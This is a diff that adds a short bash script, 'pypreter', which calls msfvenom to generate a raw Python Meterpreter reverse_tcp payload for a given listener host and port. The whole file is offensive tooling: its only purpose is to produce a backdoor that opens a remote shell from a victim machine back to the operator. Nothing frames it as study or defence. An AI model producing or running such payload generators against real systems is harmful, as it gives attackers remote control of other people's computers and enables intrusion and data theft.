@@ -1,0 +1,8 @@
+#!/bin/bash
+
+if [ "$#" -eq 2 ]; then
+	msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST="$1" LPORT="$2"
+else
+	echo "usage: pypreter <lhost> <lport>"
+	echo "        generate meterpreter payload for python"
+fi
